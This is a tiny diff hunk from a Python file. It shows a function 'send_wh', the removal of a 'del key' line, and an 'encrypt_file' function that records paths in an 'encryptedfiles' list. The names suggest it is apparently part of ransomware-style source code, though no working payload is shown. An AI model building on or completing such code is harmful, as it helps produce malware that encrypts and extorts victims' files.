@@ -127,8 +127,6 @@ def send_wh():
     except Exception:
         pass
 
-    del key
-
 def encrypt_file(file_path):
     encryptedfiles.append(file_path)
 
